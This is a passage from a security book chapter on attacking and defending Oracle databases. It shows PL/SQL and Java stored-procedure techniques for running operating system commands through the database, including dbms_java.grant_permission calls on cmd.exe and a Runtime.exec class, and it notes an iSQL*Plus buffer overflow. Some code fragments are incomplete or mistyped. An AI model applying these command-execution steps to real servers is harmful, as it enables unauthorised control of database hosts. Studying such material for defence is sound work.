
# Chapter 13 • Attacking and Defending Oracle

library and exports such functions as exec() and system(). Once the library is in place, a PL/SQL package needs to be created to call one of the functions exported by msvcrt.dll. The "bare-bones" package is followed by the package body. It is during the creation of the package body the C function is called is stipulated. In this case, the package will call the system() function. The system() function accepts a single parameter that is a command to be executed.. Once the package has created, exec oracmd.exec procedure can be called in the following fashion:

```
SQL> exec oracmd.exec ('dir c:oracle.txt');
```

In this way, arbitrary operating system commands can be executed through Oracle. As you can see, the LIBRARY set of privileges can be dangerous in the wrong hands. If a remote database user has CREATE LIBRARY privilege, she will be able to create a library as I have demonstrated, and as the owner of the new object, she will be automatically to execute the procedure.

But what about C libraries already defined in the database server? Even if an attacker may not CREATE or ALTER an existing library, she may still be able to use bad effects already there. To list the libraries that have already been created, run the following query:

```
select a.filespec, b.object_name
from library$ a, all_objects b
where length(a.filespec) > 0
and a.obj# = b.object_id
```

On the author's database, the libraries returned are shown in Table 13.1.

# Table 13.1 External Libraries

| Library | Name |
| --- | --- |
| C:\ora9ias\bin\oraqsmashr.dll | DBMS_SUMADV_LIB |
| C:\win\system32\msvcrt.dll | EXEC_SHELL |
| C:\ora9ias\bin\oraordim9.dll | ORDIMLIBS |
| C:\ora9ias\bin\oraoctxx9.dll | DR$LIB |
| ..\lib\ssxdlap.dll | AUTH_EXT |

By examining extant libraries, an attacker without CREATE or ALTER library privileges may still be able to compromise the system. He can reverse engineer the DLLs looking for buffer overflow vulnerabilities or format string bugs.

# Java Stored Procedures

Another way of extending functionality of an Oracle Database Server is with the use of Java Stored Procedures. This can impact security greatly because anyone with the CREATE PROCEDURE privilege can code her own Java class. There are some limitations to exactly what can be done by privileged users, but before getting to that, I examine how Java Stored Procedures and functions are created.

As was already stated, with the CREATE PROCEDURE privilege can create a Java class for the database server. To list the users that have been assigned the CREATE PROCEDURE privilege, run the following query:

```
select unique grantee from dba_role_privs
where granted_role in
(select grantee from dba_sys_privs
where privilege LIKE 'CREATEPROCEDURE%')
and not in (select role from dba_roles);
```

A large number of users are usually returned. One can enter Java source directly into SQL*PLUS using the CREATE OR REPLACE JAVA SOURCE query.

In this example, the default user SCOTT logged into the database server and ran the following query:

```
create replace java source named "ScottTest" AS
import java.sql.*;
import java.io.*;
```

```
public class ScottTest
{
    public static String concat(String firstName, String secondString)
    {
        return firstName + secondString;
    }
}
```

Once executed, the Java source is compiled into a Java class file, and it is now ready to be called from a function or package:

```
create or replace function javatest
(str1 in varchar2, str2 in varchar2)
return varchar2
```

With the function created, it can now be called:

```
set serveroutput on size 100
declare
temp varchar2(100);
Begin
  temp := javatest('AAA', 'BBB');
dbms_output.put_line(temp);
end;
```

Although this is a very cool bit of functionality, being able to code Java directly into the database server opens a massive vessel of worms as far security is concerned. For example, it’s possible to run operating system commands in certain circumstances. Although some permissions may to be granted with the DBMS_JAVA.GRANT_PERMISSION procedure, those with the relevant updates privileges the PolicyTable will be able to grant themselves these rights. By default, anyone granted the JAVA_ADMIN role has this ability. These permissions may also be granted to developers and other less privileged users. He’ll assume that an attacker wants to run an operating system command:

```
exec dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission', 'c:\\windows\system32\cmd.exe', 'execute' );

exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', ' ');

exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', ' ');
```

The source of the Java required to run commands is as follows:

```
import java.lang.Runtime;
import java.lang.Process;
import java.io.IOException;
import java.lang.InterruptedException;
```

# Attacking and Defending Oracle • Chapter 13

```
class JExecCmd {
    public static void main(String args[]) {
        try {
            Process p = Runtime.getRuntime().exec(args[0]);
        } catch (IOException e) {
            System.out.println(e.getMessage());
            e.printStackTrace();
        }
    }
}
```

Once created, it's then possible to execute operating system commands through Java Stored Procedures: exec jexeccmd ('c:\windows\system32\cmd.exe /c dir > c:\java2.txt');

This vulnerability allows a remote user with dangerous Java privileges to execute commands on the operating system that is running.

# Attacking the Oracle Application Server

Oracle produces a Web front end to bolt into their database server. Although this Application server is based on Apache, famed for its security, it seems as soon as you layer any decent functionality on top it becomes insecure. This section details issues in Oracle's Application Server.

Although Oracle Application Server is based on Apache, Oracle Application Server can be identified by examining the server field in the HTTP header. The server field returns hints about the version installed and the components installed, but it does not clearly define the patch level.

![](img/729efc56f204a2ebffb8295c3a2dfdfb_721_0.png)

The banner strings from the HTTP header for 9iAS Release 2 is as follows:
Oracle9iAS/9.0.2 Oracle HTTP Server

This is actually not particularly helpful for determining what patches
have not been installed, which is good since you really don't want an attacker
nto be able to look up that information. The banner string from a 9iAS Release 1
was more typical as follows:

Oracle HTTP Server Powered By Apache/1.3.19

This did give an attacker some information, although it was somewhat
limited. The following is the banner string from an older version of Oracle
Application Server:

Apache/1.3.12 (Unix) mod_plsq/3.0.9.8b ApacheJServ/1.1 mod_ssl/2.6.4
OpenSSL

Notice that this banner string gave you some very detailed information that
could have helped an attack. It seems that Oracle has become a little
smarter in later versions in this regard.

# Vulnerabilities in 9iAS 2

Several of the vulnerabilities I address in this section were not patched at the time
of writing. Once again, Oracle Corporation was alerted to these security holes,
they are working on a patch which is expected in early 2003. Once the
patch is available, more information about the vulnerability and the patch will
appear on http://otn.oracle.com/deploy/security/alerts.html.

# Buffer Overflow Vulnerability in iSQL*Plus

iSQL*Plus is a Web-based version of SQL*Plus. This URL will open a login
page for the iSQL*Plus application: http://oraclewebserver:7777/isqlplus. By
submitting an overly long username, a saved return address on the stack is over-
written, and an attacker can gain control over the Apache process' execution.
This is a classic buffer overflow vulnerability.

Oracle has provided a patch for a vulnerability. To download the patch
from Metalink, search for patches on the bug number 2581911. An advi-
sory for this vulnerability is available from Oracle at http://otn.oracle.com/
deploy/security/pdf/2002alert46rev1.pdf.
